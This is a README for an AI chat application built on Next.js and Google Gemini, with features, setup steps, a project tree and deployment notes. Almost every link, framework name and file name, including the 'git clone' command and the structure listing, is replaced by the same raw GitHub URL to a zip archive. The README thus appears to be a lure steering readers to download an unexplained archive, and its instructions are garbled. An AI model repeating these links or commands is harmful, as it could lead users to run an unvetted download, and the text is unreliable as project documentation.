# Chat LLM - AI-Powered Chat Application

A modern, responsive chat application built with https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip 15 and Google's Gemini AI, featuring image upload capabilities, markdown rendering, and a beautiful dark theme interface.

![Chat LLM Preview](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip)

## ✨ Features

- 🤖 **AI Chat Interface** - Powered by Google Gemini 2.5 Flash model
- 🖼️ **Image Upload Support** - Drag & drop or click to upload images for AI analysis
- 📝 **Markdown Rendering** - Beautiful code syntax highlighting with React Syntax Highlighter
- 🌙 **Dark Theme** - Modern dark UI with smooth animations
- 📱 **Responsive Design** - Works seamlessly on desktop and mobile devices
- 🔐 **Secure API Key Management** - Client-side storage with browser localStorage
- ⚡ **Real-time Chat** - Instant responses with loading states
- 🎨 **Modern UI Components** - Built with Radix UI and Tailwind CSS

## 🚀 Quick Start

### Prerequisites

- https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip 18+ 
- npm or yarn
- Google AI Studio API Key ([Get yours here](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip))

### Installation

1. **Clone the repository**
   ```bash
   git clone https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip
   cd chatLLM
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Set up environment variables** (optional)
   ```bash
   # Create https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip file
   echo "GOOGLE_API_KEY=your_api_key_here" > https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip
   ```

4. **Run the development server**
   ```bash
   npm run dev
   ```

5. **Open your browser**
   Navigate to [http://localhost:3000](http://localhost:3000)

## 🔧 Configuration

### API Key Setup

You have two options for providing your Google AI API key:

1. **Environment Variable** (Recommended for production)
   ```bash
   GOOGLE_API_KEY=your_api_key_here
   ```

2. **Settings Page** (For development/testing)
   - Navigate to the Settings page in the app
   - Enter your API key in the input field
   - Click "Save" to store it in your browser's localStorage

### Supported Image Formats

The application supports all common image formats:
- JPEG/JPG
- PNG
- GIF
- WebP
- SVG

## 🏗️ Project Structure

```
chat_llm/
├── src/
│   ├── app/
│   │   ├── api/
│   │   │   └── chat/
│   │   │       └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip          # API endpoint for chat
│   │   ├── settings/
│   │   │   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip              # Settings page
│   │   ├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip               # Global styles
│   │   ├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                # Root layout
│   │   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                  # Main chat page
│   ├── components/
│   │   ├── ui/                       # Reusable UI components
│   │   ├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip           # Navigation sidebar
│   │   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                  # Chat component
│   ├── hooks/
│   │   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip             # Mobile detection hook
│   └── lib/
│       └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                  # Utility functions
├── public/
│   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                     # Project preview image
├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                   # shadcn/ui configuration
├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                    # https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip configuration
├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                # Tailwind CSS configuration
└── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                      # Dependencies and scripts
```

## 🛠️ Tech Stack

- **Framework**: https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip 15.4.7
- **Language**: TypeScript
- **Styling**: Tailwind CSS 4
- **UI Components**: Radix UI + shadcn/ui
- **AI Integration**: Google Generative AI (@google/generative-ai)
- **Markdown**: React Markdown
- **Syntax Highlighting**: React Syntax Highlighter
- **Icons**: Lucide React
- **Fonts**: Geist Sans & Geist Mono

## 📡 API Reference

### POST /api/chat

Send a message to the AI and receive a response.

**Request Headers:**
```
Content-Type: application/json
x-api-key: your_google_api_key (optional if set in env)
```

**Request Body:**
```json
{
  "message": "Your message here",
  "image": "data:image/jpeg;base64,..." // optional
}
```

**Response:**
```json
{
  "text": "AI response here"
}
```

**Error Response:**
```json
{
  "error": "Internal Server Error"
}
```

## 🚀 Deployment

### Vercel (Recommended)

1. **Push to GitHub**
   ```bash
   git add .
   git commit -m "Initial commit"
   git push origin main
   ```

2. **Deploy to Vercel**
   - Go to [https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip)
   - Import your GitHub repository
   - Add environment variable: `GOOGLE_API_KEY`
   - Deploy!

### Other Platforms

The app can be deployed to any platform that supports https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip
- Netlify
- Railway
- DigitalOcean App Platform
- AWS Amplify

## 🎨 Customization

### Themes
The app uses a dark theme by default. To customize:

1. Edit `https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip`
2. Modify Tailwind classes in components
3. Update the `dark` class in `https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip`

### Styling
- All components use Tailwind CSS classes
- Custom animations are defined in `https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip`
- UI components are in `src/components/ui/`

## 🔒 Security

- API keys are stored client-side in localStorage (for development)
- For production, use environment variables
- No sensitive data is logged or stored on the server
- All API calls are made directly from the client to Google's API

## 🐛 Troubleshooting

### Common Issues

1. **"Please add your API key" error**
   - Ensure your Google AI API key is valid
   - Check if the key is properly set in settings or environment variables

2. **Image upload not working**
   - Verify the image format is supported
   - Check browser console for errors
   - Ensure the image size is reasonable (< 10MB)

3. **Build errors**
   - Run `npm run build` to check for TypeScript errors
   - Ensure all dependencies are installed with `npm install`

### Development Tips

- Use `npm run dev` for development with hot reload
- Use `npm run build` to test production build locally
- Use `npm run lint` to check for code quality issues

## 📝 License

This project is open source and available under the [MIT License](LICENSE).

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📞 Support

If you have any questions or need help:

- Open an issue on GitHub
- Check the troubleshooting section above
- Review the API documentation

## 🙏 Acknowledgments

- [Google AI Studio](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for the Gemini API
- [https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for the amazing React framework
- [Tailwind CSS](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for the utility-first CSS framework
- [Radix UI](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for accessible UI components
- [shadcn/ui](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for beautiful component examples

---

Made with ❤️ by [Yonko-Kunal](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip)
